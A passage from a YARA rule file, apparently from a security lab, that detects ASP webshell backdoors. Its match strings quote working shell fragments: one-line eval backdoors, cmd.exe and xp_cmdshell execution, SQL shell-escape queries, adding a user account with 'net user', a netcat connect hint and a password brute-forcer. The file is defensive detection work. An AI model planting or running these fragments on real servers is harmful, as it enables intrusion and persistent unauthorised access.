        $s13 = "rOqzS&}n@#@&~,P~/AOP10x^\"+bO3KA%+;Ovr8D`Z~!*#@#@&P,+Uf,/i$@#@&P,KD&\\b:n~?!4,mJldd|K3It(xzYn@#@&PP~~k2PP1W{16DC&1o@#@&,~+" fullword ascii
        $s14 = "xO+.ErP^Vmd/{/4GSVkdODN@*@!m~4Dn6'ELl7lk^DbwO)wEsswWDscJrJ[\"n2lDCvn)Yu'r-E[^ 1zH3bLJJESrJ/Wazwks" fullword ascii
        $s15 = "\\+ksk^nxJ,[,\\8Z.J6P'PrRfb/C8^+'TE,[~\\(/MSW,[,JO\"+^KlDtd'8J~',\\4;.S6P[,m@#@&rOg+nNjn1E.+{TJ,[~-(ZDJW,[~J ubNn_k9N+" fullword ascii
        $s16 = "YPK?D.+m:~',1GO4kxT@#@&AxN,o;x1YbWU@#@&o!x^YbGx,tna9+mcdDDrx*~@#@&9b:,k~,LB~3BP.+kEsO,@#@&Mn/!VY,x~!,@#@&sGD~r,'~F,PW,SnUv/Y.r" fullword ascii
        $s17 = ".ncv#=ZC/n~rZ.+mO+tN8E=ZDnCD+\\N(~w1Cs+=Zlk+,EZK:2l1Y\\[(J);G:almD\\[4,sglh+l/m/nPr94tlUCT+DElG4\\l" fullword ascii
        $s18 = "@!&m@*@!JY9@*@!JYM@*Pr@#@&BN4E@!DD@*@!ON,t+bL4Y{By v@*@!C,t.+6xB4YO2=zzAASR1%O0O%qcmK:zaDJ_?!4hkD'QY~ ]A1_ufFu)o_LNK:CkUxr[" fullword ascii
        $s19 = "?q.2Bok^2jYzIP@#@&PPa]kjbYA~dE~P;VC/jm&1(Kb)Vb}n@#@&PPW(d+dk\\3,'~Z@#@&PP6k^n/:l]K{PT@#@&PPAHN,/E(@#@&P,w`Asq^~6jUmDrr" fullword ascii
        $s20 = "+6D@#@&k+Y,a2WkY,'~m.nmYnW(%+1YcEt?(\\JyRpHdu:KKr#@#@&6aWkORKwnx,JK6UKJB~J4YYal&z8 FRTRT 8)E[,2WMY~'rzVnC7+dJB~DD;" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_21fd0ada0d0c86b6899d5b7af4b55e72884a5513
{
     meta:
        description = "asp - file 21fd0ada0d0c86b6899d5b7af4b55e72884a5513.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
     strings:
        $x1 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /" fullword ascii
        $x2 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":o SI:SI=\"\":If tri" ascii
        $x3 = "strBAD=strBAD&\"If Session(\"\"\"&clientPassword&\"\"\")<>\"\"\"\" Then Execute Session(\"\"\"&clientPassword&\"\"\")\"" fullword ascii
        $x4 = "\"\";var speed = 10000;var x = 0;var color = new initArray(\"\"#ffff00\"\", \"\"#ff0000\"\", \"\"#ff00ff\"\",\"\"#0000ff\"\",\"" ascii
        $x5 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\"&targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
        $x6 = "='#003000'\"\"><a href='?Action=Cmd1Shell' target='FileFrame'><font face='wingdings'>8</font> CMD---" fullword ascii
        $x7 = "<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $x8 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $x9 = "if ShellPath=\"\" Then ShellPath=\"cmd.exe\"" fullword ascii
        $x10 = "STRQUERY=\"DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')\"" fullword ascii
        $s11 = "='\"&DefCmd&\"'> <input type='submit' value='Execute'></td></tr><tr><td id=d><textarea Style='width:100%;height:440;'>\"" fullword ascii
        $s12 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s13 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s14 = "http.SetRequestHeader \"REFERER\", \"\"&net&\"\"&request.ServerVariables(\"HTTP_HOST\")&request.ServerVariables(\"URL\")" fullword ascii
        $s15 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /C " ascii
        $s16 = "or='#003000'\"\"><a href='?Action=Logout' target='FileFrame'><center><font face='wingdings'>8</font> " fullword ascii
        $s17 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s18 = "CMD=CHR(34)&\"CMD.EXE /C \"&REQUEST.FORM(\"CMD\")&\" > 8617.TMP\"&CHR(34)" fullword ascii
        $s19 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s20 = "STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SANDBOXMOD" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_7300c5590ef79fa8984efb241786f55849ed8fa0
{
     meta:
        description = "asp - file 7300c5590ef79fa8984efb241786f55849ed8fa0.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dad2fbae4c177135c75e0f08cfcfd7211591d4d081df4a1ab04202a770786cbb"
     strings:
        $s1 = "body,ul,li{margin:0;padding:0;font-family:Tahoma;}a{color:#0265FF;text-decoration:none}a:hover{color:#003B99}li{display:block}.c" ascii
        $s2 = "<meta content=\"fa\" http-equiv=\"Content-Language\">" fullword ascii
        $s3 = ";height:10px;width:10px;padding:4px 15px 16px 5px;font-size:17px;font-family:Arial;border-radius:5px;font-weight:bold}" fullword ascii
        $s4 = "<div style='margin-top:30px;width:100%;font:700 20px Arial;color:#FF6358;text-align:right;direction:rtl;'><b>" fullword ascii
        $s5 = "<meta http-equiv=\"refresh\" content=\"30\">" fullword ascii
        $s6 = "<a href=\"mailto:support@persiangig.com\" style=\"font-family:tahoma;font-size:10px;float:left;margin-left:50px;direction:rtl\">" ascii
        $s7 = "<body bgcolor='ffffff' bordermarginheight='0' marginwidth='0' rightmargin='0' leftmargin='0' topmargin='0'>" fullword ascii
        $s8 = "<a href=\"mailto:support@persiangig.com\" style=\"font-family:tahoma;font-size:10px;float:left;margin-left:50px;direction:rtl\">" ascii
        $s9 = "ort@Persiangig.com</a>" fullword ascii
        $s10 = "<a href=\"/\" title=\"Persiangig\"><div id=\"logo\"><h2>" fullword ascii
        $s11 = "<span style='font-family:tahoma;font-size:10px;float:right;text-align:right;direction:rtl;'>" fullword ascii
        $s12 = "px}#ads{float:right;width:130px}#footer{clear:both;height:90px;margin-top:-90px;position:relative}body:before{content:\"\";float" ascii
        $s13 = "<div style='font-family:tahoma;font-size:10px;text-align:right;direction:rtl;'>" fullword ascii
        $s14 = "<div id=\"header-wrap\">" fullword ascii
        $s15 = "<div style=\"margin:0 auto; width:210px\" id=\"footer\">" fullword ascii
        $s16 = "<div id=\"right\" style=\"height:100px;width:250px\"></div>" fullword ascii
        $s17 = "<a href=\"/abuse/\"><div id=\"tab-report\" class=\"tab\"><center>" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule f3398832f697e3db91c3da71a8e775ebf66c7e73
{
     meta:
        description = "asp - file f3398832f697e3db91c3da71a8e775ebf66c7e73.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "25dcb3c200f51d3f39f2859d71516ec0b1a3a4c2b93c9ea0bc4ce9d5894a2f0e"
     strings:
        $x1 = "sResult = oWshl.Exec(\"cmd.exe /c del \" & rootPath & \"\\ReadRegX\").StdOut.ReadAll()" fullword ascii
        $x2 = "sResult = oWshl.Exec(\"cmd.exe /c type \" & rootPath & \"\\ReadRegX\").StdOut.ReadAll()" fullword ascii
        $x3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, P Text, fileContent Image)\")" fullword ascii
        $x4 = "O(1)<option value=\"\"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\winnt\\system32\\ias\\ias.mdb','select s" ascii
        $x5 = "e<option value=\"\"DROP TABLE [jnc];exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','Sand" ascii
        $x6 = "quot;cmd.exe /c copy 8617.tmp jnc.tmp&quot;)');BULK INSERT [jnc] FROM 'jnc.tmp' WITH (KEEPNULLS);\"\">xp_regwrite" fullword ascii
        $x7 = "\"<option value=\"\"Exec master.dbo.XP_CMDShell 'net user lcx lcx /add'\"\">XP_CMDShell" fullword ascii
        $x8 = "t;cmd.exe /c del 8617.tmp&&del jnc.tmp&quot;)');\"\">xp_regwrite" fullword ascii
        $x9 = "_sp_OACreate<option value=\"\"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')\"\">" fullword ascii
        $x10 = "@o out exec sp_oamethod @o,'run',NULL,'cmd /c net user > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS);\"" ascii
        $x11 = "(2)<option value=\"\"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'wscript.shell" ascii
        $x12 = "sCmd = \"RegEdit.exe /e \"\"\" & rootPath & \"\\ReadRegX\"\" \"\"\" & thePath & \"\"\"\"" fullword ascii
        $s13 = "_xp_cmdshell<option value=\"\"Use master dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"\">" fullword ascii
        $s14 = "<option value=\"\" EXEC [master].[dbo].[xp_makecab] 'c:\\test.cab','default',1,'d:\\cmd.asp'\"\">" fullword ascii
        $s15 = "Response.AddHeader \"Content-Disposition\", \"Attachment; Filename=\" & Mid(sUrlB, InStrRev(sUrlB, \"/\") + 1)" fullword ascii
        $s16 = "Response.Write(\"oShl.ShellExecute \" & appName & \", \" & appArgs & \", \" & appPath & \", \"\"\"\", 0\")" fullword ascii
        $s17 = "cmdStr = \"c:\\progra~1\\WinRAR\\Rar.exe a \"\"\" & cmdStr & \"\\Packet.rar\"\" \"\"\" & cmdStr & \"\"\"\"" fullword ascii
        $s18 = "\"<option value=\"\"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\M" ascii
        $s19 = "document.write(\"<a href=\\\"javascript:Command('Query','\" + i + \"');\\\">\");" fullword ascii
        $s20 = "<option value=\"\"DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c" ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule b0052ca72a607c9bfc67e64c87486609978bd183
{
     meta:
        description = "asp - file b0052ca72a607c9bfc67e64c87486609978bd183.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e72d86bc9ba25ab61126a8a3ee9dd0d8466eec8c14accdcf4a206fb583352e0e"
     strings:
        $x1 = "ss_get.asp?a=Response.Write(CreateObject(\"WScript.Shell\").exec(\"ipconfig\").StdOut.ReadAll)" fullword ascii
        $s2 = "Send the following GET request in order to send your command" fullword ascii
        $s3 = "<%execute Request.QueryString(\"a\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_0bfe1eef2a22093ea7304aa800f87f24228bc2b5
{
     meta:
        description = "asp - file 0bfe1eef2a22093ea7304aa800f87f24228bc2b5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
     strings:
        $x1 = "jgb.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,binPath VarChar,binContent Image)\")" fullword ascii
        $x2 = ".0',';database=\" & path &\"','select shell(\"&chr(34)&\"cmd.exe /c \"&kkw&\" > 8617.tmp\"&chr(34)&\")');\")" fullword ascii
        $x3 = "\"&gbp&\"32\\ias\\ias.mdb','select shell(&quot;cmd.exe /c del 8617.tmp&&del jnc.tmp&quot;)');\"\">xp_regwrite" fullword ascii
        $x4 = "jgb.execute(\"select * from openrowS\"&owm&\"et('microsoft.jet.oledb.4.0',';database=\" & path &\"','select shell(\"&chr(34)&\"c" ascii
        $x5 = "\\PremiumSoft\\\"&br&\"x:\\manager\\HostManagerService\\\"&br&\"x:\\rar\\\"&br&\"x:\\StatisticsClient\\analog6\\analyzeres\\\"&b" ascii
        $x6 = "jgb.Execute(\"create table [jnc](resulttxt nvarchar(1024) null);exec mast\"&kvp&\"er..xp_regwrite 'hkey_local_machine','SOF\"&jj" ascii
        $x7 = "\\\"&br&\"x:\\Program Files\\Common Files\\Thunder Network\\\"&br&\"x:\\Program Files\\Common Files\\Borland Shared\\BDE\\\"&br&" ascii
        $x8 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL_MACHINE','SOF\"&jjl&\"TWARE\\Microsoft\\Jet\\4." ascii
        $x9 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\dat" ascii
        $x10 = "\\\"&br&\"x:\\ISAPI_Rewrite3\\\"&br&\"x:\\IMail\\\"&br&\"x:\\com\\\"&br&\"x:\\Program Files\\FlashFXP\\\"&br&\"x:\\FlashFXP\\\"&" ascii
        $x11 = "jgb.execute(\"select * from openrowS\"&owm&\"et('microsoft.jet.oledb.4.0',';database=\" & path &\"','select shell(\"&chr(34)&\"c" ascii
        $x12 = "jgb.Execute(\"create table [jnc](resulttxt nvarchar(1024) null);use mast\"&kvp&\"er declare @o int exec sp_oacre\"&nnm&\"ate 'WS" ascii
        $x13 = "Set rs=jgb.Execute(\"select count(*) from mast\"&kvp&\"er.dbo.sysobjects where xtype='x' and name='\"&x&\"'\")" fullword ascii
        $x14 = "(2)\\\"&br&\"x:\\Imail\\\"&br&\"x:\\tools\\flashftp\\\"&br&\"x:\\tools\\ftp2\\\"&br&\"x:\\Rewrite\\Rewrite.dll\"&br&\"x:\\FTP" fullword ascii
        $x15 = "txk=\"drop table [jnc];exec mast\"&kvp&\"er..xp_regwrite 'hkey_local_machine','SOF\"&jjl&\"TWARE\\microsoft\\jet\\4.0\\Engi\"&dm" ascii
        $x16 = "(\"&chr(34)&\"cmd.exe /c del 8617.tmp&&del jnc.tmp\"&chr(34)&\")');\"" fullword ascii
        $x17 = "bvn=\"<title>\"&nkw&\" - \"&jmc&\" </title><style type='text/css'>body{border:0;margin:0;table-layout:fixed;color:\"&cl(13)&\";f" ascii
        $x18 = "r.dll\"&br&\"x:\\webwww\\\"&br&\"x:\\iislog\\\"&br&\"x:\\Program Files\\QQ2007\\qq.exe \"" fullword ascii
        $x19 = "7i24.com\\Serverdoctor\\log\\\"&br&\"x:\\DBbackup\\\"&br&\"x:\\Oracle\\\"&br&\"x:\\VhostManage\\DataBase\\site.mdb\"&br&\"x:\\8u" ascii
        $x20 = "s\\SogouInput\\\"&br&\"x:\\imail\\\"&br&\"x:\\hzhost\\hzhost_conpanel\\\"&br&\"x:\\ftproot\\\"&br&\"x:\\Config.Msi\\\"&br&\"x:" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule fc4650d414b08b749b4873e6d3b37879048d1973
{
     meta:
        description = "asp - file fc4650d414b08b749b4873e6d3b37879048d1973.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3d579442aa2f6e66691c03da5b240782ad092cd0b86f025546021c35fa66d207"
     strings:
        $s1 = "<%execute(unescape(\"eval%20request%28%22aaa%22%29\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_16a2cd13eacd4d1d4a0f7e2e125205f153a4c8f6
{
     meta:
        description = "asp - file 16a2cd13eacd4d1d4a0f7e2e125205f153a4c8f6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ff753fda2b86325ce018a56429a6e324eb7a05e2893eeee240b9e73708277817"
     strings:
        $x1 = "Set pipe = sh.Exec(\"%COMSPEC% /C \" & chdir  & \" && \" & cmd)" fullword ascii
        $s2 = "target.style.background = '\" & shell_color & \"';\" &_" fullword ascii
        $s3 = "\"<input style=\"\"width:300px;\"\" type=\"\"text\"\" name=\"\"childname\"\" value=\"\"\" & shell_name & \".asp\"\"; />\" &_" fullword ascii
        $s4 = "<%@ Language = \"VBscript\" %><% On Error Resume Next %><% Server.ScriptTimeout=600 %><% session.lcid=2057 %>" fullword ascii
        $s5 = "Set objCollection = objWMIService.ExecQuery _" fullword ascii
        $s6 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
        $s7 = "Response.Write execute(Request.QueryString(\"eval\"))" fullword ascii
        $s8 = "Response.AddHeader \"Content-transfer-encoding\", \"binary\"" fullword ascii
        $s9 = "var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';" fullword ascii
        $s10 = "Response.AddHeader \"Content-Disposition\", \"attachment;filename=\"& fname &\"\"" fullword ascii
        $s11 = "shell_password = \"devilzc0der\"" fullword ascii
        $s12 = "\"<div style=\"\"font-size:10px;\"\">\" & shell_fake_name & \"</div>\" &_" fullword ascii
        $s13 = "html_head = \"<title>\" & html_title & \"</title>\" & shell_style" fullword ascii
        $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '                                                 ' */
        $s15 = "shell_fake_name = \"Server Logging System\"" fullword ascii
        $s16 = "If(check = shell_password) Then" fullword ascii
        $s17 = "var target = document.getElementById(address);\" &_" fullword ascii
        $s18 = "wBind=\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" &_" fullword ascii
        $s19 = "Response.Cookies(\"pass\").Expires = Date - 7" fullword ascii
        $s20 = "html_onload = \"onload=\"\"document.getElementById('cmd').focus();\"\"\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ad55512afa109b205e4b1b7968a89df0cf781dc9
{
     meta:
        description = "asp - file ad55512afa109b205e4b1b7968a89df0cf781dc9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ceda95fc6b88c2ea931800da3e27faaf8967e6d71f0bf857557695a347f0e8f4"
     strings:
        $s1 = "set rs=conn.Execute(sql)" fullword ascii
        $s2 = "set fso=server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s3 = "file.write chr(13) + chr(10)" fullword ascii
        $s4 = "SET conn= Server.CreateObject(\"ADODB.Connection\")" fullword ascii
        $s5 = "set file=fso.createtextfile(server.mappath(request(\"filename\")),8,true)" fullword ascii
        $s6 = "<script language=javascript>function checkform()" fullword ascii
        $s7 = "<form method=post id=form1>" fullword ascii
        $s8 = "<input type=text size=20 name=sqluser>" fullword ascii
        $s9 = "<input type=text size=20 name=sqlpass>" fullword ascii
        $s10 = "<script language=javascript></script>" fullword ascii
     condition:
        ( uint16(0) == 0x733c and filesize < 5KB and ( all of them ) ) or ( all of them )
}

rule fc44fd7475ee6c0758ace2b17dd41ed7ea75cc73
{
     meta:
        description = "asp - file fc44fd7475ee6c0758ace2b17dd41ed7ea75cc73.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d848adfcf2e867652dbeb5664ee720695c7ab4f94b72fdaef5aa759277ba6af0"
     strings:
        $x1 = "response.Write(\"I Get it ! Password is <font color=red>\" & str & \"</font><BR>Process \" & tTime & \" s\")" fullword ascii
        $s2 = "response.Write \"Done!<br>Process \" & tTime & \" s\"" fullword ascii
        $s3 = "<div align=\"center\">Welcome to <a href=\"http://bbs.1937cn.com/forum.php\" TNT blog=\"_blank\">http://bbs.1937cn.com/forum.php" ascii
        $s4 = "<div align=\"center\">Welcome to <a href=\"http://bbs.1937cn.com/forum.php\" TNT blog=\"_blank\">http://bbs.1937cn.com/forum.php" ascii
        $s5 = "<input name=\"path\" type=\"text\" value=\"<%=Server.MapPath(\"r.txt\")%>\" size=\"50\">" fullword ascii
        $s6 = "'http://bbs.1937cn.com/forum.php" fullword ascii
        $s7 = "<form name=\"form1\" method=\"post\" action=\"\" onSubmit=\"form1.Submit.disabled=true;\">" fullword ascii
        $s8 = "<input name=\"conn\" type=\"text\" id=\"conn\" value=\"Provider=SQLOLEDB.1;Data Source=127.0.0.1;User ID=sa;Password={PASS};\" s" ascii
        $s9 = "<input name=\"conn\" type=\"text\" id=\"conn\" value=\"Provider=SQLOLEDB.1;Data Source=127.0.0.1;User ID=sa;Password={PASS};\" s" ascii
        $s10 = "password(i) = Mid(Char, i, 1)" fullword ascii
        $s11 = "pass = str & password(j)" fullword ascii
        $s12 = "response.Write(Err.Description & \"<BR>\")" fullword ascii
        $s13 = "conn.open Replace(ConnStr,\"{PASS}\",str)" fullword ascii
        $s14 = "<input name=\"Submit\" type=\"submit\" id=\"Submit\" value=\" Run \">" fullword ascii
        $s15 = "<input name=\"char\" type=\"text\" id=\"char\" value=\"0123456789\" size=\"30\">" fullword ascii
        $s16 = "ReDim password(LenChar)" fullword ascii
        $s17 = "Set conn = Server.CreateObject(\"ADODB.connection\")" fullword ascii
        $s18 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s19 = "<input name=\"CFile\" type=\"checkbox\" id=\"CFile\" value=\"1\" checked>" fullword ascii
        $s20 = ".buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_16932789e6e44c4d47eea9f426de2f7114ec5847
{
     meta:
        description = "asp - file 16932789e6e44c4d47eea9f426de2f7114ec5847.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "097a5e87c1c01119cf7bfabc8f7e93212cf1ef98e405ba131b762723f8a2b275"
     strings:
        $s1 = "execute(play)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_3c69293d2377d31d82cbf7d151fec6d04411ee1f
{
     meta:
        description = "asp - file 3c69293d2377d31d82cbf7d151fec6d04411ee1f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d3bc4102bba36224ad94e0f8a23cc31f8a9278f5fc1797693329204ef0b15e6b"
     strings:
        $x1 = "returnContent = server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&command).stdout.readall" fullword ascii
        $x2 = "set rS=adoCon.Execute(command, intAffected)" fullword ascii
        $x3 = "'myInfo.add \"msgResponse\", \"SQL Command Execute Successful !\"" fullword ascii
        $s4 = "objNetwork.MapNetworkDrive driverLetter & \":\", remoteShare, True, userName, password" fullword ascii
        $s5 = "Dim myInfo, targetPath, foldersId, filesId, ndir, nfile, dir, file, itemName, itemPath, gMsg" fullword ascii
        $s6 = "Dim objNetwork, myInfo, driverLetter, remoteShare, userName, password" fullword ascii
        $s7 = "FSO.CopyFolder itemPath, targetPath, true" fullword ascii
        $s8 = "FSO.CopyFile itemPath, targetPath, true" fullword ascii
        $s9 = "Response.Write \"<form onSubmit=\"\"runCMD();return false;\"\" method=\"\"post\"\">\"" fullword ascii
        $s10 = "FSO.MoveFolder itemPath, targetPath" fullword ascii
        $s11 = "FSO.MoveFile itemPath,targetPath" fullword ascii
        $s12 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & objFile.Name" fullword ascii
        $s13 = "Response.Write \"<form onSubmit=\"\"CopyMove('move', getId('remoteMove').value);return false;\"\">\"" fullword ascii
        $s14 = "Response.Write \"<form onSubmit=\"\"CopyMove('copy', getId('remoteCopy').value);return false;\"\">\"" fullword ascii
        $s15 = "connection\"\" size='121' value='Provider=SQLOLEDB;Data Source=127.0.0.1;database=master;uid=sa;pwd=;' type='text'></TD>\"" fullword ascii
        $s16 = "Response.Write \"<meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=utf-8\"\">\"" fullword ascii
        $s17 = "Response.Write \"<form onSubmit=\"\"mapDriver();return false;\"\" method=\"\"post\"\">\"" fullword ascii
        $s18 = ".add \"msgResponse\", \"Mapped \" & driverLetter & \": to \" & remoteShare & \" !\"" fullword ascii
        $s19 = "value='ipconfig /all' type='text'><input value=\"\".: Run :.\"\" type='submit'></TD></TR>\"" fullword ascii
        $s20 = "Response.Write \"<form onSubmit=\"\"runSQL();return false;\"\" method=\"\"post\"\">\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9a62585a84a9f6fc8f7b24d03854035775c0836a
{
     meta:
        description = "asp - file 9a62585a84a9f6fc8f7b24d03854035775c0836a.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "93177e1471efb943ad80857d85aa7fef22580ce27ece934b18559b0f090dac2e"
     strings:
        $s1 = "<%execute(request(\"xiaoma\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_84331cb4c4744122f53e7ebf03dc7f4d274fa977
{
     meta:
        description = "asp - file 84331cb4c4744122f53e7ebf03dc7f4d274fa977.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ccf03064a22299a639f914aa15e760bf4062fe0073da4d2d0533ef7105446e47"
     strings:
        $x1 = "If path=\"\" Then path=\"C:\\WINDOWS\\system32\\cmd.exe\"" fullword ascii
        $x2 = "<tr><td colspan=\"2\" align=\"center\"><h2><a href = \"http://le4f.net/\" target=\"_blank\">AspExec</a></h2></td></tr>" fullword ascii
        $s3 = "newshell.ShellExecute path,parms,\"\",\"open\",0" fullword ascii
        $s4 = "result=shell.exec(path&\" \"&parms).stdout.readall" fullword ascii
        $s5 = "<form method=\"post\" action=\"<%=Request.ServerVariables(\"SCRIPT_NAME\")%>\" id=\"submitf\">" fullword ascii
        $s6 = "Response.Write \"<tr><td width='80'>\" & theComponent(i) & \"</td><td><font color=\"\"green\"\">" fullword ascii
        $s7 = "'exec command" fullword ascii
        $s8 = "Response.Write \"<tr><td width='80'>\" & theComponent(i) & \"</td><td><font color=\"\"red\"\">" fullword ascii
        $s9 = "file_name = Server.MapPath(\"./\") & Replace(Request.ServerVariables(\"Script_Name\"),\"/\",\"\\\")" fullword ascii
        $s10 = "result=\"Shell.application Execute OK.\"" fullword ascii
        $s11 = "<title>AspExec</title>" fullword ascii
        $s12 = "<object runat=server id=shell scope=page classid=\"clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B\"></object>" fullword ascii
        $s13 = "<object runat=server id=shell scope=page classid=\"clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8\"></object>" fullword ascii
        $s14 = "<input type=\"submit\" name= \"submit\" value=\"wscript.shell\">" fullword ascii
        $s15 = "theComponent(0) = \"Scripting.FileSystemObject\"" fullword ascii
        $s16 = "theComponent(1) = \"WScript.Shell\"" fullword ascii
        $s17 = "theComponent(2) = \"WScript.Shell.1\"" fullword ascii
        $s18 = "Parms:<textarea name=\"parms\" style='width:100%;height:70%;'><% Response.Write parms %></textarea>" fullword ascii
        $s19 = "theComponent(3) = \"WScript.Network\"" fullword ascii
        $s20 = "theComponent(4) = \"WScript.Network.1\"" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 10KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule aeed35a4d6a958a159934a7067b342b1d26630bc
{
     meta:
        description = "asp - file aeed35a4d6a958a159934a7067b342b1d26630bc.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "101bf8dcdd414f09ba46cdecbd96e8606c79b0e76b6a2ce040395e775cb4da86"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
        $s2 = "' -- Read the output from our command and remove the temp file -- '" fullword ascii
